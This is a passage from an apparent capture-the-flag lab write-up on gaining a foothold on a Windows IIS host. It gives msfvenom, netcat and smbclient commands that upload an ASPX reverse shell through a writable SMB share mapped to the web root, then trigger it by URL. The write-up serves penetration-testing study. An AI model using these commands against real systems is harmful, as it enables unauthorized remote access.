Generating and Uploading a Reverse Shell
IIS is Microsoft's web server and executes ASPX files (Active Server Pages). Since the nt4wrksv SMB share mapped directly to the IIS web root being served on port 49663, uploading an ASPX file via SMB meant IIS would execute it when visited in a browser.
Generated the shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_VPN_IP LPORT=4444 -f aspx -o shell.aspx
start your listener:
```
nc -lvnp 4444
```
 connect to the share and upload:
bash
```
smbclient //10.129.178.147/nt4wrksv -U Bob
put shell.aspx
```


Triggered by visiting: ``` http://10.129.178.147:49663/nt4wrksv/shell.aspx

This gave a reverse shell running as iis apppool\defaultapppool — a low privilege IIS service account.


